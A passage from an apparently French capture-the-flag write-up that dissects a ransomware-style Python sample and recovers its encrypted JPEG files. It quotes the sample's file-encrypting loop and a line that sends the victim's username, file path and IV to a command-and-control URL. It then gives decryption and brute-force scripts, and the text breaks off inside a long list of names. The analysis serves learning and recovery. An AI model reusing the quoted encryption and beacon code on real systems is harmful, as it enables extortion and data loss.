</span></span><span class=line><span class=cl><span class=n>hsh</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>hsh</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>hsh</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>La clé est donc le md5 du username. Les deux lignes suivantes servent à initialiser l&rsquo;AES:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>cip</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=c1># AES ECB</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>get_random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Il faut de l&rsquo;AES ECB avec comme clé le <code>md5(username)</code> et génère un vecteur d&rsquo;initialisation (IV). Hors, l&rsquo;AES ECB n&rsquo;a pas d&rsquo;IV.</p><p>Les deux lignes suivantes envoient les paramètres AES au serveur de command and control:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>params</span> <span class=o>=</span> <span class=p>((</span><span class=s1>&#39;target&#39;</span><span class=p>,</span> <span class=n>username</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>,</span> <span class=n>path</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;iv&#39;</span><span class=p>,</span> <span class=n>iv</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>C2_URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Bon, et maintenant le vif du sujet: la crypto. On va reprendre cette fonction en ne gardant que l&rsquo;algo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>génération de la clé
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=n>get_username</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>hsh</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>hsh</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>hsh</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>init de l&#39;AES
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cip</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>get_random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>tambouille
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=p>(</span><span class=n>fi</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span> <span class=o>+</span> <span class=s1>&#39;.hacked&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=p>(</span><span class=n>fo</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>block</span> <span class=o>=</span> <span class=n>fi</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>block</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>block</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>block</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=n>cipherblock</span> <span class=o>=</span> <span class=n>cip</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>xorbytes</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=n>iv</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>iv</span> <span class=o>=</span> <span class=n>cipherblock</span>
</span></span><span class=line><span class=cl>                <span class=n>fo</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>cipherblock</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>block</span> <span class=o>=</span> <span class=n>fi</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;algo &ldquo;tambouille&rdquo;, rappelle l&rsquo;AES CBC, utilisant l&rsquo;IV. A savoir que la différence entre l&rsquo;AES ECB et CBC est justement ce vecteur d&rsquo;initialisation. Le schéma suivant représente l&rsquo;AES CBC lors du chiffrement:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png data-srcset="/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png, /lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png 1.5x, /lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png title=/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png></p><p>On admet donc que c&rsquo;est de l&rsquo;AES CBC dont on connait la clé mais pas l&rsquo;IV. On peut dire qu&rsquo;on connait la clé, car les usernames utilisées sont présent dans la liste TARGETS, il suffira de bruteforce pour trouver le bon.</p><h2 id=euréka>Euréka</h2><p>Analysons les informations en notre possessions:</p><ul><li>Images JPEG chiffrées</li><li>AES CBC dont on connait la clé mais pas l&rsquo;IV</li></ul><p>Et ci-dessous le schéma de déchiffrement de l&rsquo;AES CBC:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png data-srcset="/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png, /lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png 1.5x, /lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png title=/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png></p><p>Le schéma ci-dessus donne une information vraiment intéressante: si on ne connais pas l&rsquo;IV, seul le premier block sera illisible, mais tout le reste se base sur la clé.</p><p>On peut faire un test très simple:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Random</span> <span class=kn>import</span> <span class=n>get_random_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_fn</span><span class=p>(</span><span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hsh</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ENC_DATA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>get_random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>DATA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>KEY</span> <span class=o>=</span> <span class=n>md5_fn</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;maki&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>DATA</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;Coucou j&#39;aime beaucoup les fleurs, surtout quand elle sentent bo&#34;</span> <span class=c1># Oui c&#39;est juste pour que ça fasse un multiple de 16</span>
</span></span><span class=line><span class=cl><span class=n>ENC_DATA</span> <span class=o>=</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>decrypt</span><span class=p>(</span><span class=n>KEY</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>On génère un chiffré d&rsquo;une string connue avec un IV aléatoire et on déchiffre avec la clé mais un IV fait que de null bytes. Ce snippet retourne:</p><blockquote><p>b&rsquo;\xf3fw\xf6\x15MFTq\xbd\xad\x9c\xbd\x06\xad\x83aucoup les fleurs, surtout quand elle sentent bo'</p></blockquote><p>Seul le premier block est illisible. Le second est parfaitement déchiffré.</p><h2 id=format-jpeg>Format JPEG</h2><p>Intéressons nous au format JPEG, pour savoir s&rsquo;il est possible de reconstruire ce premier block. Prenons 3 images aléatoires sur Google images:</p><ol><li><a href=http://image.jeuxvideo.com/medias-md/157675/1576752756-4689-card.jpg target=_blank rel="noopener noreffer">http://image.jeuxvideo.com/medias-md/157675/1576752756-4689-card.jpg</a></li><li><a href=https://static.lpnt.fr/images/2017/08/07/9591045lpw-9591057-article-jpg_4474173_980x426.jpg target=_blank rel="noopener noreffer">https://static.lpnt.fr/images/2017/08/07/9591045lpw-9591057-article-jpg_4474173_980x426.jpg</a></li><li><a href=https://www.digital.security/fr/sites/default/files/illu-actu/logo_digital-security.jpg target=_blank rel="noopener noreffer">https://www.digital.security/fr/sites/default/files/illu-actu/logo_digital-security.jpg</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file *.jpg
</span></span><span class=line><span class=cl>1576752756-4689-card.jpg:                           JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 768x432, components <span class=m>3</span>
</span></span><span class=line><span class=cl>9591045lpw-9591057-article-jpg_4474173_980x426.jpg: JPEG image data, JFIF standard 1.01, resolution <span class=o>(</span>DPI<span class=o>)</span>, density 72x72, segment length 16, progressive, precision 8, 980x426, components <span class=m>3</span>
</span></span><span class=line><span class=cl>logo_digital-security.jpg:                          JPEG image data, JFIF standard 1.01, resolution <span class=o>(</span>DPI<span class=o>)</span>, density 100x100, segment length 16, progressive, precision 8, 440x260, components <span class=m>3</span>
</span></span></code></pre></td></tr></table></div></div><p>Maintenant regardons les headers de ces 3 images JPEG:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> i in <span class=k>$(</span>ls *.jpg<span class=k>)</span><span class=p>;</span> <span class=k>do</span> hexdump -C <span class=nv>$i</span><span class=p>|</span>head -n <span class=m>2</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;&#34;</span><span class=p>;</span> <span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png data-srcset="/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png 1.5x, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png title=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png></p><p>Une bonne partie du premier block est identique. En patchant le future fichier déchiffré avec:</p><blockquote><p>ff d8 ff e0 00 10 4a 46 49 46 00 01 01 00 00 01</p></blockquote><p>Alors il est possible que l&rsquo;image soit déchiffrée malgrès l&rsquo;absence de l&rsquo;IV. Cependant, avant de faire ça, il faut trouver le bon username pour trouver la clé AES.</p><p>Pour cela, on sait que le premier bloc déchiffré sera le dernier bloc de la photo. De plus, on sait qu&rsquo;un fichier JPEG se termine toujours par <code>\xff\xd9</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> i in <span class=k>$(</span>ls *.jpg<span class=k>)</span><span class=p>;</span> <span class=k>do</span> hexdump -C <span class=nv>$i</span><span class=p>|</span>tail -n2 <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;&#34;</span><span class=p>;</span> <span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png data-srcset="/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png 1.5x, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png title=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png></p><h2 id=trouver-la-clé-aes>Trouver la clé AES</h2><p>Sachant ça, on peut supposer que le username utilisé est dans la liste &ldquo;TARGETS&rdquo;. Le snippet suivant va bruteforce jusqu&rsquo;à trouver la signature de fin:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DATA</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;DCIM-0533.jpg.hacked&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>TARGETS</span> <span class=o>=</span> <span class=p>[</span><span class=sa>b</span><span class=s1>&#39;Scott Farquhar&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lei Jun&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Reid Hoffman&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Zhou Qunfei&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jeff Bezos&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Shiv Nadar&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Simon Xie&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Ma Huateng&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Ralph Dommermuth&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Barry Lam&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Nathan Blecharczyk&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Judy Faulkner&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;William Ding&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Scott Cook&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Gordon Moore&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Marc Benioff&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Michael Dell&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Yusaku Maezawa&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Yuri Milner&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Bobby Murphy&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Larry Page&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Henry Samueli&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jack Ma&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jen-Hsun Huang&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jay Y. Lee&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Joseph Tsai&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Dietmar Hopp&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Henry Nicholas, III.&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Dustin Moskovitz&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Mike Cannon-Brookes&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Robert Miller&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Bill Gates&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Garrett Camp&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lin Xiucheng&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Gil Shwed&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Sergey Brin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Rishi Shah&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Denise Coates&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Zhang Fan&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Michael Moritz&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Robin Li&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Andreas von Bechtolsheim&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Brian Acton&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Sean Parker&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;John Doerr&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Cheriton&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Brian Chesky&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Wang Laisheng&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jan Koum&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jack Sheerack&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Terry Gou&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Adam Neumann&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;James Goodnight&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Larry Ellison&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Wang Laichun&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Masayoshi Son&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Min Kao&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Hiroshi Mikitani&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lee Kun-Hee&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Sun&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Mark Scheinberg&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Yeung Kin-man&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;John Tu&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Teddy Sagi&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Frank Wang&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Robert Pera&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Eric Schmidt&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Wang Xing&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Evan Spiegel&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Travis Kalanick&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Steve Ballmer&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Mark Zuckerberg&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jason Chang&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lam Wai Ying&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Romesh T. Wadhwani&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Liu Qiangdong&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jim Breyer&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Zhang Zhidong&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Pierre Omidyar&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Elon Musk&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Filo&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Joe Gebbia&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jiang Bin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Pan Zhengmin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Douglas Leone&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Hasso Plattner&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Paul Allen&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Meg Whitman&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Azim Premji&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Fu Liquan&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jeff Rothschild&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;John Sall&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Kim Jung-Ju&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Duffield&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Gabe 